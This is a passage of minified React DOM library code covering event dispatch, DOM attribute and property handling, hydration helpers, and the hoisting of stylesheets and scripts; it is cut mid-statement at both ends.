$=y;$;$=te($))_++;for(;0<j-_;)E=te(E),j--;for(;0<_-j;)y=te(y),_--;for(;j--;){if(E===y||y!==null&&E===y.alternate){te=E;break t}E=te(E),y=te(y)}te=null}else te=null;R!==null&&Ff(k,w,R,te,!1),X!==null&&Ce!==null&&Ff(k,Ce,X,te,!0)}}e:{if(w=C?un(C):window,R=w.nodeName&&w.nodeName.toLowerCase(),R==="select"||R==="input"&&w.type==="file")var ge=hu;else if(du(w))if(pu)ge=eg;else{ge=Im;var W=Fm}else R=w.nodeName,!R||R.toLowerCase()!=="input"||w.type!=="checkbox"&&w.type!=="radio"?C&&Io(C.elementType)&&(ge=hu):ge=$m;if(ge&&(ge=ge(e,C))){fu(k,ge,l,D);break e}W&&W(e,w,C),e==="focusout"&&C&&w.type==="number"&&C.memoizedProps.value!=null&&Fo(w,"number",w.value)}switch(W=C?un(C):window,e){case"focusin":(du(W)||W.contentEditable==="true")&&(Ca=W,fi=C,vn=null);break;case"focusout":vn=fi=Ca=null;break;case"mousedown":hi=!0;break;case"contextmenu":case"mouseup":case"dragend":hi=!1,Au(k,l,D);break;case"selectionchange":if(lg)break;case"keydown":case"keyup":Au(k,l,D)}var ie;if(ri)e:{switch(e){case"compositionstart":var pe="onCompositionStart";break e;case"compositionend":pe="onCompositionEnd";break e;case"compositionupdate":pe="onCompositionUpdate";break e}pe=void 0}else ja?cu(e,l)&&(pe="onCompositionEnd"):e==="keydown"&&l.keyCode===229&&(pe="onCompositionStart");pe&&(ou&&l.locale!=="ko"&&(ja||pe!=="onCompositionStart"?pe==="onCompositionEnd"&&ja&&(ie=tu()):(Al=D,ai="value"in Al?Al.value:Al.textContent,ja=!0)),W=fo(C,pe),0<W.length&&(pe=new nu(pe,e,null,l,D),k.push({event:pe,listeners:W}),ie?pe.data=ie:(ie=uu(l),ie!==null&&(pe.data=ie)))),(ie=Qm?Km(e,l):Zm(e,l))&&(pe=fo(C,"onBeforeInput"),0<pe.length&&(W=new nu("onBeforeInput","beforeinput",null,l,D),k.push({event:W,listeners:pe}),W.data=ie)),Bg(k,e,C,l,D)}Jf(k,t)})}function Pn(e,t,l){return{instance:e,listener:t,currentTarget:l}}function fo(e,t){for(var l=t+"Capture",a=[];e!==null;){var n=e,s=n.stateNode;if(n=n.tag,n!==5&&n!==26&&n!==27||s===null||(n=dn(e,l),n!=null&&a.unshift(Pn(e,n,s)),n=dn(e,t),n!=null&&a.push(Pn(e,n,s))),e.tag===3)return a;e=e.return}return[]}function Vg(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5&&e.tag!==27);return e||null}function Ff(e,t,l,a,n){for(var s=t._reactName,c=[];l!==null&&l!==a;){var h=l,b=h.alternate,C=h.stateNode;if(h=h.tag,b!==null&&b===a)break;h!==5&&h!==26&&h!==27||C===null||(b=C,n?(C=dn(l,s),C!=null&&c.unshift(Pn(l,C,b))):n||(C=dn(l,s),C!=null&&c.push(Pn(l,C,b)))),l=l.return}c.length!==0&&e.push({event:t,listeners:c})}var Pg=/\r\n?/g,Xg=/\u0000|\uFFFD/g;function If(e){return(typeof e=="string"?e:""+e).replace(Pg,`
`).replace(Xg,"")}function $f(e,t){return t=If(t),If(e)===t}function je(e,t,l,a,n,s){switch(l){case"children":typeof a=="string"?t==="body"||t==="textarea"&&a===""||Ta(e,a):(typeof a=="number"||typeof a=="bigint")&&t!=="body"&&Ta(e,""+a);break;case"className":ms(e,"class",a);break;case"tabIndex":ms(e,"tabindex",a);break;case"dir":case"role":case"viewBox":case"width":case"height":ms(e,l,a);break;case"style":Ic(e,a,s);break;case"data":if(t!=="object"){ms(e,"data",a);break}case"src":case"href":if(a===""&&(t!=="a"||l!=="href")){e.removeAttribute(l);break}if(a==null||typeof a=="function"||typeof a=="symbol"||typeof a=="boolean"){e.removeAttribute(l);break}a=xs(""+a),e.setAttribute(l,a);break;case"action":case"formAction":if(typeof a=="function"){e.setAttribute(l,"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");break}else typeof s=="function"&&(l==="formAction"?(t!=="input"&&je(e,t,"name",n.name,n,null),je(e,t,"formEncType",n.formEncType,n,null),je(e,t,"formMethod",n.formMethod,n,null),je(e,t,"formTarget",n.formTarget,n,null)):(je(e,t,"encType",n.encType,n,null),je(e,t,"method",n.method,n,null),je(e,t,"target",n.target,n,null)));if(a==null||typeof a=="symbol"||typeof a=="boolean"){e.removeAttribute(l);break}a=xs(""+a),e.setAttribute(l,a);break;case"onClick":a!=null&&(e.onclick=Jt);break;case"onScroll":a!=null&&fe("scroll",e);break;case"onScrollEnd":a!=null&&fe("scrollend",e);break;case"dangerouslySetInnerHTML":if(a!=null){if(typeof a!="object"||!("__html"in a))throw Error(r(61));if(l=a.__html,l!=null){if(n.children!=null)throw Error(r(60));e.innerHTML=l}}break;case"multiple":e.multiple=a&&typeof a!="function"&&typeof a!="symbol";break;case"muted":e.muted=a&&typeof a!="function"&&typeof a!="symbol";break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"defaultValue":case"defaultChecked":case"innerHTML":case"ref":break;case"autoFocus":break;case"xlinkHref":if(a==null||typeof a=="function"||typeof a=="boolean"||typeof a=="symbol"){e.removeAttribute("xlink:href");break}l=xs(""+a),e.setAttributeNS("http://www.w3.org/1999/xlink","xlink:href",l);break;case"contentEditable":case"spellCheck":case"draggable":case"value":case"autoReverse":case"externalResourcesRequired":case"focusable":case"preserveAlpha":a!=null&&typeof a!="function"&&typeof a!="symbol"?e.setAttribute(l,""+a):e.removeAttribute(l);break;case"inert":case"allowFullScreen":case"async":case"autoPlay":case"controls":case"default":case"defer":case"disabled":case"disablePictureInPicture":case"disableRemotePlayback":case"formNoValidate":case"hidden":case"loop":case"noModule":case"noValidate":case"open":case"playsInline":case"readOnly":case"required":case"reversed":case"scoped":case"seamless":case"itemScope":a&&typeof a!="function"&&typeof a!="symbol"?e.setAttribute(l,""):e.removeAttribute(l);break;case"capture":case"download":a===!0?e.setAttribute(l,""):a!==!1&&a!=null&&typeof a!="function"&&typeof a!="symbol"?e.setAttribute(l,a):e.removeAttribute(l);break;case"cols":case"rows":case"size":case"span":a!=null&&typeof a!="function"&&typeof a!="symbol"&&!isNaN(a)&&1<=a?e.setAttribute(l,a):e.removeAttribute(l);break;case"rowSpan":case"start":a==null||typeof a=="function"||typeof a=="symbol"||isNaN(a)?e.removeAttribute(l):e.setAttribute(l,a);break;case"popover":fe("beforetoggle",e),fe("toggle",e),ps(e,"popover",a);break;case"xlinkActuate":Zt(e,"http://www.w3.org/1999/xlink","xlink:actuate",a);break;case"xlinkArcrole":Zt(e,"http://www.w3.org/1999/xlink","xlink:arcrole",a);break;case"xlinkRole":Zt(e,"http://www.w3.org/1999/xlink","xlink:role",a);break;case"xlinkShow":Zt(e,"http://www.w3.org/1999/xlink","xlink:show",a);break;case"xlinkTitle":Zt(e,"http://www.w3.org/1999/xlink","xlink:title",a);break;case"xlinkType":Zt(e,"http://www.w3.org/1999/xlink","xlink:type",a);break;case"xmlBase":Zt(e,"http://www.w3.org/XML/1998/namespace","xml:base",a);break;case"xmlLang":Zt(e,"http://www.w3.org/XML/1998/namespace","xml:lang",a);break;case"xmlSpace":Zt(e,"http://www.w3.org/XML/1998/namespace","xml:space",a);break;case"is":ps(e,"is",a);break;case"innerText":case"textContent":break;default:(!(2<l.length)||l[0]!=="o"&&l[0]!=="O"||l[1]!=="n"&&l[1]!=="N")&&(l=vm.get(l)||l,ps(e,l,a))}}function Ur(e,t,l,a,n,s){switch(l){case"style":Ic(e,a,s);break;case"dangerouslySetInnerHTML":if(a!=null){if(typeof a!="object"||!("__html"in a))throw Error(r(61));if(l=a.__html,l!=null){if(n.children!=null)throw Error(r(60));e.innerHTML=l}}break;case"children":typeof a=="string"?Ta(e,a):(typeof a=="number"||typeof a=="bigint")&&Ta(e,""+a);break;case"onScroll":a!=null&&fe("scroll",e);break;case"onScrollEnd":a!=null&&fe("scrollend",e);break;case"onClick":a!=null&&(e.onclick=Jt);break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"innerHTML":case"ref":break;case"innerText":case"textContent":break;default:if(!Vc.hasOwnProperty(l))e:{if(l[0]==="o"&&l[1]==="n"&&(n=l.endsWith("Capture"),t=l.slice(2,n?l.length-7:void 0),s=e[ot]||null,s=s!=null?s[l]:null,typeof s=="function"&&e.removeEventListener(t,s,n),typeof a=="function")){typeof s!="function"&&s!==null&&(l in e?e[l]=null:e.hasAttribute(l)&&e.removeAttribute(l)),e.addEventListener(t,a,n);break e}l in e?e[l]=a:a===!0?e.setAttribute(l,""):ps(e,l,a)}}}function et(e,t,l){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"img":fe("error",e),fe("load",e);var a=!1,n=!1,s;for(s in l)if(l.hasOwnProperty(s)){var c=l[s];if(c!=null)switch(s){case"src":a=!0;break;case"srcSet":n=!0;break;case"children":case"dangerouslySetInnerHTML":throw Error(r(137,t));default:je(e,t,s,c,l,null)}}n&&je(e,t,"srcSet",l.srcSet,l,null),a&&je(e,t,"src",l.src,l,null);return;case"input":fe("invalid",e);var h=s=c=n=null,b=null,C=null;for(a in l)if(l.hasOwnProperty(a)){var D=l[a];if(D!=null)switch(a){case"name":n=D;break;case"type":c=D;break;case"checked":b=D;break;case"defaultChecked":C=D;break;case"value":s=D;break;case"defaultValue":h=D;break;case"children":case"dangerouslySetInnerHTML":if(D!=null)throw Error(r(137,t));break;default:je(e,t,a,D,l,null)}}Zc(e,s,h,b,C,c,n,!1);return;case"select":fe("invalid",e),a=c=s=null;for(n in l)if(l.hasOwnProperty(n)&&(h=l[n],h!=null))switch(n){case"value":s=h;break;case"defaultValue":c=h;break;case"multiple":a=h;default:je(e,t,n,h,l,null)}t=s,l=c,e.multiple=!!a,t!=null?Aa(e,!!a,t,!1):l!=null&&Aa(e,!!a,l,!0);return;case"textarea":fe("invalid",e),s=n=a=null;for(c in l)if(l.hasOwnProperty(c)&&(h=l[c],h!=null))switch(c){case"value":a=h;break;case"defaultValue":n=h;break;case"children":s=h;break;case"dangerouslySetInnerHTML":if(h!=null)throw Error(r(91));break;default:je(e,t,c,h,l,null)}Wc(e,a,n,s);return;case"option":for(b in l)l.hasOwnProperty(b)&&(a=l[b],a!=null)&&(b==="selected"?e.selected=a&&typeof a!="function"&&typeof a!="symbol":je(e,t,b,a,l,null));return;case"dialog":fe("beforetoggle",e),fe("toggle",e),fe("cancel",e),fe("close",e);break;case"iframe":case"object":fe("load",e);break;case"video":case"audio":for(a=0;a<Vn.length;a++)fe(Vn[a],e);break;case"image":fe("error",e),fe("load",e);break;case"details":fe("toggle",e);break;case"embed":case"source":case"link":fe("error",e),fe("load",e);case"area":case"base":case"br":case"col":case"hr":case"keygen":case"meta":case"param":case"track":case"wbr":case"menuitem":for(C in l)if(l.hasOwnProperty(C)&&(a=l[C],a!=null))switch(C){case"children":case"dangerouslySetInnerHTML":throw Error(r(137,t));default:je(e,t,C,a,l,null)}return;default:if(Io(t)){for(D in l)l.hasOwnProperty(D)&&(a=l[D],a!==void 0&&Ur(e,t,D,a,l,void 0));return}}for(h in l)l.hasOwnProperty(h)&&(a=l[h],a!=null&&je(e,t,h,a,l,null))}function Qg(e,t,l,a){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"input":var n=null,s=null,c=null,h=null,b=null,C=null,D=null;for(R in l){var k=l[R];if(l.hasOwnProperty(R)&&k!=null)switch(R){case"checked":break;case"value":break;case"defaultValue":b=k;default:a.hasOwnProperty(R)||je(e,t,R,null,a,k)}}for(var w in a){var R=a[w];if(k=l[w],a.hasOwnProperty(w)&&(R!=null||k!=null))switch(w){case"type":s=R;break;case"name":n=R;break;case"checked":C=R;break;case"defaultChecked":D=R;break;case"value":c=R;break;case"defaultValue":h=R;break;case"children":case"dangerouslySetInnerHTML":if(R!=null)throw Error(r(137,t));break;default:R!==k&&je(e,t,w,R,a,k)}}Wo(e,c,h,b,C,D,s,n);return;case"select":R=c=h=w=null;for(s in l)if(b=l[s],l.hasOwnProperty(s)&&b!=null)switch(s){case"value":break;case"multiple":R=b;default:a.hasOwnProperty(s)||je(e,t,s,null,a,b)}for(n in a)if(s=a[n],b=l[n],a.hasOwnProperty(n)&&(s!=null||b!=null))switch(n){case"value":w=s;break;case"defaultValue":h=s;break;case"multiple":c=s;default:s!==b&&je(e,t,n,s,a,b)}t=h,l=c,a=R,w!=null?Aa(e,!!l,w,!1):!!a!=!!l&&(t!=null?Aa(e,!!l,t,!0):Aa(e,!!l,l?[]:"",!1));return;case"textarea":R=w=null;for(h in l)if(n=l[h],l.hasOwnProperty(h)&&n!=null&&!a.hasOwnProperty(h))switch(h){case"value":break;case"children":break;default:je(e,t,h,null,a,n)}for(c in a)if(n=a[c],s=l[c],a.hasOwnProperty(c)&&(n!=null||s!=null))switch(c){case"value":w=n;break;case"defaultValue":R=n;break;case"children":break;case"dangerouslySetInnerHTML":if(n!=null)throw Error(r(91));break;default:n!==s&&je(e,t,c,n,a,s)}Jc(e,w,R);return;case"option":for(var X in l)w=l[X],l.hasOwnProperty(X)&&w!=null&&!a.hasOwnProperty(X)&&(X==="selected"?e.selected=!1:je(e,t,X,null,a,w));for(b in a)w=a[b],R=l[b],a.hasOwnProperty(b)&&w!==R&&(w!=null||R!=null)&&(b==="selected"?e.selected=w&&typeof w!="function"&&typeof w!="symbol":je(e,t,b,w,a,R));return;case"img":case"link":case"area":case"base":case"br":case"col":case"embed":case"hr":case"keygen":case"meta":case"param":case"source":case"track":case"wbr":case"menuitem":for(var te in l)w=l[te],l.hasOwnProperty(te)&&w!=null&&!a.hasOwnProperty(te)&&je(e,t,te,null,a,w);for(C in a)if(w=a[C],R=l[C],a.hasOwnProperty(C)&&w!==R&&(w!=null||R!=null))switch(C){case"children":case"dangerouslySetInnerHTML":if(w!=null)throw Error(r(137,t));break;default:je(e,t,C,w,a,R)}return;default:if(Io(t)){for(var Ce in l)w=l[Ce],l.hasOwnProperty(Ce)&&w!==void 0&&!a.hasOwnProperty(Ce)&&Ur(e,t,Ce,void 0,a,w);for(D in a)w=a[D],R=l[D],!a.hasOwnProperty(D)||w===R||w===void 0&&R===void 0||Ur(e,t,D,w,a,R);return}}for(var E in l)w=l[E],l.hasOwnProperty(E)&&w!=null&&!a.hasOwnProperty(E)&&je(e,t,E,null,a,w);for(k in a)w=a[k],R=l[k],!a.hasOwnProperty(k)||w===R||w==null&&R==null||je(e,t,k,w,a,R)}function eh(e){switch(e){case"css":case"script":case"font":case"img":case"image":case"input":case"link":return!0;default:return!1}}function Kg(){if(typeof performance.getEntriesByType=="function"){for(var e=0,t=0,l=performance.getEntriesByType("resource"),a=0;a<l.length;a++){var n=l[a],s=n.transferSize,c=n.initiatorType,h=n.duration;if(s&&h&&eh(c)){for(c=0,h=n.responseEnd,a+=1;a<l.length;a++){var b=l[a],C=b.startTime;if(C>h)break;var D=b.transferSize,k=b.initiatorType;D&&eh(k)&&(b=b.responseEnd,c+=D*(b<h?1:(h-C)/(b-C)))}if(--a,t+=8*(s+c)/(n.duration/1e3),e++,10<e)break}}if(0<e)return t/e/1e6}return navigator.connection&&(e=navigator.connection.downlink,typeof e=="number")?e:5}var Br=null,Gr=null;function ho(e){return e.nodeType===9?e:e.ownerDocument}function th(e){switch(e){case"http://www.w3.org/2000/svg":return 1;case"http://www.w3.org/1998/Math/MathML":return 2;default:return 0}}function lh(e,t){if(e===0)switch(t){case"svg":return 1;case"math":return 2;default:return 0}return e===1&&t==="foreignObject"?0:e}function qr(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.children=="bigint"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var Yr=null;function Zg(){var e=window.event;return e&&e.type==="popstate"?e===Yr?!1:(Yr=e,!0):(Yr=null,!1)}var ah=typeof setTimeout=="function"?setTimeout:void 0,Jg=typeof clearTimeout=="function"?clearTimeout:void 0,nh=typeof Promise=="function"?Promise:void 0,Wg=typeof queueMicrotask=="function"?queueMicrotask:typeof nh<"u"?function(e){return nh.resolve(null).then(e).catch(Fg)}:ah;function Fg(e){setTimeout(function(){throw e})}function Bl(e){return e==="head"}function sh(e,t){var l=t,a=0;do{var n=l.nextSibling;if(e.removeChild(l),n&&n.nodeType===8)if(l=n.data,l==="/$"||l==="/&"){if(a===0){e.removeChild(n),en(t);return}a--}else if(l==="$"||l==="$?"||l==="$~"||l==="$!"||l==="&")a++;else if(l==="html")Xn(e.ownerDocument.documentElement);else if(l==="head"){l=e.ownerDocument.head,Xn(l);for(var s=l.firstChild;s;){var c=s.nextSibling,h=s.nodeName;s[cn]||h==="SCRIPT"||h==="STYLE"||h==="LINK"&&s.rel.toLowerCase()==="stylesheet"||l.removeChild(s),s=c}}else l==="body"&&Xn(e.ownerDocument.body);l=n}while(l);en(t)}function oh(e,t){var l=e;e=0;do{var a=l.nextSibling;if(l.nodeType===1?t?(l._stashedDisplay=l.style.display,l.style.display="none"):(l.style.display=l._stashedDisplay||"",l.getAttribute("style")===""&&l.removeAttribute("style")):l.nodeType===3&&(t?(l._stashedText=l.nodeValue,l.nodeValue=""):l.nodeValue=l._stashedText||""),a&&a.nodeType===8)if(l=a.data,l==="/$"){if(e===0)break;e--}else l!=="$"&&l!=="$?"&&l!=="$~"&&l!=="$!"||e++;l=a}while(l)}function Vr(e){var t=e.firstChild;for(t&&t.nodeType===10&&(t=t.nextSibling);t;){var l=t;switch(t=t.nextSibling,l.nodeName){case"HTML":case"HEAD":case"BODY":Vr(l),Zo(l);continue;case"SCRIPT":case"STYLE":continue;case"LINK":if(l.rel.toLowerCase()==="stylesheet")continue}e.removeChild(l)}}function Ig(e,t,l,a){for(;e.nodeType===1;){var n=l;if(e.nodeName.toLowerCase()!==t.toLowerCase()){if(!a&&(e.nodeName!=="INPUT"||e.type!=="hidden"))break}else if(a){if(!e[cn])switch(t){case"meta":if(!e.hasAttribute("itemprop"))break;return e;case"link":if(s=e.getAttribute("rel"),s==="stylesheet"&&e.hasAttribute("data-precedence"))break;if(s!==n.rel||e.getAttribute("href")!==(n.href==null||n.href===""?null:n.href)||e.getAttribute("crossorigin")!==(n.crossOrigin==null?null:n.crossOrigin)||e.getAttribute("title")!==(n.title==null?null:n.title))break;return e;case"style":if(e.hasAttribute("data-precedence"))break;return e;case"script":if(s=e.getAttribute("src"),(s!==(n.src==null?null:n.src)||e.getAttribute("type")!==(n.type==null?null:n.type)||e.getAttribute("crossorigin")!==(n.crossOrigin==null?null:n.crossOrigin))&&s&&e.hasAttribute("async")&&!e.hasAttribute("itemprop"))break;return e;default:return e}}else if(t==="input"&&e.type==="hidden"){var s=n.name==null?null:""+n.name;if(n.type==="hidden"&&e.getAttribute("name")===s)return e}else return e;if(e=zt(e.nextSibling),e===null)break}return null}function $g(e,t,l){if(t==="")return null;for(;e.nodeType!==3;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!l||(e=zt(e.nextSibling),e===null))return null;return e}function ih(e,t){for(;e.nodeType!==8;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!t||(e=zt(e.nextSibling),e===null))return null;return e}function Pr(e){return e.data==="$?"||e.data==="$~"}function Xr(e){return e.data==="$!"||e.data==="$?"&&e.ownerDocument.readyState!=="loading"}function ex(e,t){var l=e.ownerDocument;if(e.data==="$~")e._reactRetry=t;else if(e.data!=="$?"||l.readyState!=="loading")t();else{var a=function(){t(),l.removeEventListener("DOMContentLoaded",a)};l.addEventListener("DOMContentLoaded",a),e._reactRetry=a}}function zt(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?"||t==="$~"||t==="&"||t==="F!"||t==="F")break;if(t==="/$"||t==="/&")return null}}return e}var Qr=null;function rh(e){e=e.nextSibling;for(var t=0;e;){if(e.nodeType===8){var l=e.data;if(l==="/$"||l==="/&"){if(t===0)return zt(e.nextSibling);t--}else l!=="$"&&l!=="$!"&&l!=="$?"&&l!=="$~"&&l!=="&"||t++}e=e.nextSibling}return null}function ch(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var l=e.data;if(l==="$"||l==="$!"||l==="$?"||l==="$~"||l==="&"){if(t===0)return e;t--}else l!=="/$"&&l!=="/&"||t++}e=e.previousSibling}return null}function uh(e,t,l){switch(t=ho(l),e){case"html":if(e=t.documentElement,!e)throw Error(r(452));return e;case"head":if(e=t.head,!e)throw Error(r(453));return e;case"body":if(e=t.body,!e)throw Error(r(454));return e;default:throw Error(r(451))}}function Xn(e){for(var t=e.attributes;t.length;)e.removeAttributeNode(t[0]);Zo(e)}var Ot=new Map,dh=new Set;function po(e){return typeof e.getRootNode=="function"?e.getRootNode():e.nodeType===9?e:e.ownerDocument}var dl=G.d;G.d={f:tx,r:lx,D:ax,C:nx,L:sx,m:ox,X:rx,S:ix,M:cx};function tx(){var e=dl.f(),t=no();return e||t}function lx(e){var t=va(e);t!==null&&t.tag===5&&t.type==="form"?Cd(t):dl.r(e)}var Fa=typeof document>"u"?null:document;function fh(e,t,l){var a=Fa;if(a&&typeof t=="string"&&t){var n=jt(t);n='link[rel="'+e+'"][href="'+n+'"]',typeof l=="string"&&(n+='[crossorigin="'+l+'"]'),dh.has(n)||(dh.add(n),e={rel:e,crossOrigin:l,href:t},a.querySelector(n)===null&&(t=a.createElement("link"),et(t,"link",e),Ze(t),a.head.appendChild(t)))}}function ax(e){dl.D(e),fh("dns-prefetch",e,null)}function nx(e,t){dl.C(e,t),fh("preconnect",e,t)}function sx(e,t,l){dl.L(e,t,l);var a=Fa;if(a&&e&&t){var n='link[rel="preload"][as="'+jt(t)+'"]';t==="image"&&l&&l.imageSrcSet?(n+='[imagesrcset="'+jt(l.imageSrcSet)+'"]',typeof l.imageSizes=="string"&&(n+='[imagesizes="'+jt(l.imageSizes)+'"]')):n+='[href="'+jt(e)+'"]';var s=n;switch(t){case"style":s=Ia(e);break;case"script":s=$a(e)}Ot.has(s)||(e=A({rel:"preload",href:t==="image"&&l&&l.imageSrcSet?void 0:e,as:t},l),Ot.set(s,e),a.querySelector(n)!==null||t==="style"&&a.querySelector(Qn(s))||t==="script"&&a.querySelector(Kn(s))||(t=a.createElement("link"),et(t,"link",e),Ze(t),a.head.appendChild(t)))}}function ox(e,t){dl.m(e,t);var l=Fa;if(l&&e){var a=t&&typeof t.as=="string"?t.as:"script",n='link[rel="modulepreload"][as="'+jt(a)+'"][href="'+jt(e)+'"]',s=n;switch(a){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":s=$a(e)}if(!Ot.has(s)&&(e=A({rel:"modulepreload",href:e},t),Ot.set(s,e),l.querySelector(n)===null)){switch(a){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":if(l.querySelector(Kn(s)))return}a=l.createElement("link"),et(a,"link",e),Ze(a),l.head.appendChild(a)}}}function ix(e,t,l){dl.S(e,t,l);var a=Fa;if(a&&e){var n=ya(a).hoistableStyles,s=Ia(e);t=t||"default";var c=n.get(s);if(!c){var h={loading:0,preload:null};if(c=a.querySelector(Qn(s)))h.loading=5;else{e=A({rel:"stylesheet",href:e,"data-precedence":t},l),(l=Ot.get(s))&&Kr(e,l);var b=c=a.createElement("link");Ze(b),et(b,"link",e),b._p=new Promise(function(C,D){b.onload=C,b.onerror=D}),b.addEventListener("load",function(){h.loading|=1}),b.addEventListener("error",function(){h.loading|=2}),h.loading|=4,mo(c,t,a)}c={type:"stylesheet",instance:c,count:1,state:h},n.set(s,c)}}}function rx(e,t){dl.X(e,t);var l=Fa;if(l&&e){var a=ya(l).hoistableScripts,n=$a(e),s=a.get(n);s||(s=l.querySelector(Kn(n)),s||(e=A({src:e,async:!0},t),(t=Ot.get(n))&&Zr(e,t),s=l.createElement("script"),Ze(s),et(s,"link",e),l.head.appendChild(s)),s={type:"script",instance:s,count:1,state:null},a.set(n,s))}}function cx(e,t){dl.M(e,t);var l=Fa;if(l&&e){var a=ya(l).hoistableScripts,n=$a(e),s=a.get(n);s||(s=l.querySelector(Kn(n)),s||(e=A({src:e,async:!0,type:"module"},t),(t=Ot.get(n))&&Zr(e,t),s=l.createElement("script"),Ze(s),et(s,"link",e),l.head.appendChild(s)),s={type:"script",instance:s,count:1,state:null},a.set(n,s))}}function hh(e,t,l,a){var n=(n=re.current)?po(n):null;if(!n)throw Error(r(446));switch(e){case"meta":case"title":return null;case"style":return typeof l.precedence=="string"&&typeof l.href=="string"?(t=Ia(l.href),l=ya(n).hoistableStyles,a=l.get(t),a||(a={type:"style",instance:null,count:0,state:null},l.set(t,a)),a):{type:"void",instance:null,count:0,state:null};case"link":if(l.rel==="stylesheet"&&typeof l.href=="string"&&typeof l.precedence=="string"){e=Ia(l.href);var s=ya(n).hoistableStyles,c=s.get(e);if(c||(n=n.ownerDocument||n,c={type:"stylesheet",instance:null,count:0,state:{loading:0,preload:null}},s.set(e,c),(s=n.querySelector(Qn(e)))&&!s._p&&(c.instance=s,c.state.loading=5),Ot.has(e)||(l={rel:"preload",as:"style",href:l.href,crossOrigin:l.crossOrigin,integrity:l.integrity,media:l.media,hrefLang:l.hrefLang,referrerPolicy:l.referrerPolicy},Ot.set(e,l),s||ux(n,e,l,c.state))),t&&a===null)throw Error(r(528,""));return c}if(t&&a!==null)throw Error(r(529,""));return null;case"script":return t=l.async,l=l.src,typeof l=="string"&&t&&typeof t!="function"&&typeof t!="symbol"?(t=$a(l),l=ya(n).hoistableScripts,a=l.get(t),a||(a={type:"script",instance:null,count:0,state:null},l.set(t,a)),a):{type:"void",instance:null,count:0,state:null};default:throw Error(r(444,e))}}function Ia(e){return'href="'+jt(e)+'"'}function Qn(e){return'link[rel="stylesheet"]['+e+"]"}function ph(e){return A({},e,{"data-precedence":e.precedence,precedence:null})}function ux(e,t,l,a){e.querySelector('link[rel="preload"][as="style"]['+t+"]")?a.loading=1:(t=e.createElement("link"),a.preload=t,t.addEventListener("load",function(){return a.loading|=1}),t.addEventListener("error",function(){return a.loading|=2}),et(t,"link",l),Ze(t),e.head.appendChild(t))}function $a(e){return'[src="'+jt(e)+'"]'}function Kn(e){return"script[async]"+e}function mh(e,t,l){if(t.count++,t.instance===null)switch(t.type){case"style":var a=e.querySelector('style[data-href~="'+jt(l.href)+'"]');if(a)return t.instance=a,Ze(a),a;var n=A({},l,{"data-href":l.href,"data-precedence":l.precedence,href:null,precedence:null});return a=(e.ownerDocument||e).createElement("style"),Ze(a),et(a,"style",n),mo(a,l.precedence,e),t.instance=a;case"stylesheet":n=Ia(l.href);var s=e.querySelector(Qn(n));if(s)return t.state.loading|=4,t.instance=s,Ze(s),s;a=ph(l),(n=Ot.get(n))&&Kr(a,n),s=(e.ownerDocument||e).createElement("link"),Ze(s);var c=s;return c._p=new Promise(function(h,b){c.onload=h,c.onerror=b}),et(s,"link",a),t.state.loading|=4,mo(s,l.precedence,e),t.instance=s;case"script":return s=$a(l.src),(n=e.querySelector(Kn(s)))?(t.instance=n,Ze(n),n):(a=l,(n=Ot.get(s))&&(a=A({},l),Zr(a,n)),e=e.ownerDocument||e,n=e.createElement("script"),Ze(n),et(n,"link",a),e.head.appendChild(n),t.instance=n);case"void":return null;default:throw Error(r(443,t.type))}else t.type==="stylesheet"&&(t.state.loading&4)===0&&(a=t.instance,t.state.loading|=4,mo(a,l.precedence,e));return t.instance}function mo(e,t,l){for(var a=l.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'),n=a.length?a[a.length-1]:null,s=n,c=0;c<a.length;c++){var h=a[c];if(h.dataset.precedence===t)s=h;else if(s!==n)break}s?s.parentNode.insertBefore(e,s.nextSibling):(t=l.nodeType===9?l.head:l,t.insertBefore(e,t.firstChild))}function Kr(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.title==null&&(e.title=t.title)}function Zr(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.integrity==null&&(e.integrity=t.integrity)}var go=null;function gh(e,t,l){if(go===null){var a=new Map,n=go=new Map;n.set(l,a)}else n=go,a=n.get(l),a||(a=new Map,n.set(l,a));if(a.has(e))return a;for(a.set(e,null),l=l.getElementsByTagName(e),n=0;n<l.length;n++){var s=l[n];if(!(s[cn]||s[We]||e==="link"&&s.getAttribute("rel")==="stylesheet")&&s.namespaceURI!=="http://www.w3.org/2000/svg"){var c=s.getAttribute(t)||"";c=e+c;var h=a.get(c);h?h.push(s):a.set(c,[s])}}return a}function xh(e,t,l){e=e.ownerDocument||e,e.head.insertBefore(l,t==="title"?e.querySelector("head > title"):null)}function dx(e,t,l){if(l===1||t.itemProp!=null)return!1;switch(e){case"meta":case"title":return!0;case"style":if(typeof t.precedence!="string"||typeof t.href!="string"||t.href==="")break;return!0;case"link":if(typeof t.rel!="string"||typeof t.href!="string"||t.href===""||t.onLoad||t.onError)break;return t.rel==="stylesheet"?(e=t.disabled,typeof t.precedence=="string"&&e==null):!0;case"script":if(t.async&&typeof t.async!="function"&&typeof t.async!="symbol"&&!t.onLoad&&!t.onError&&t.src&&typeof t.src=="string")return!0}return!1}function bh(e){return!(e.type==="stylesheet"&&(e.state.loading&3)===0)}function fx(e,t,l,a){if(l.type==="stylesheet"&&(typeof 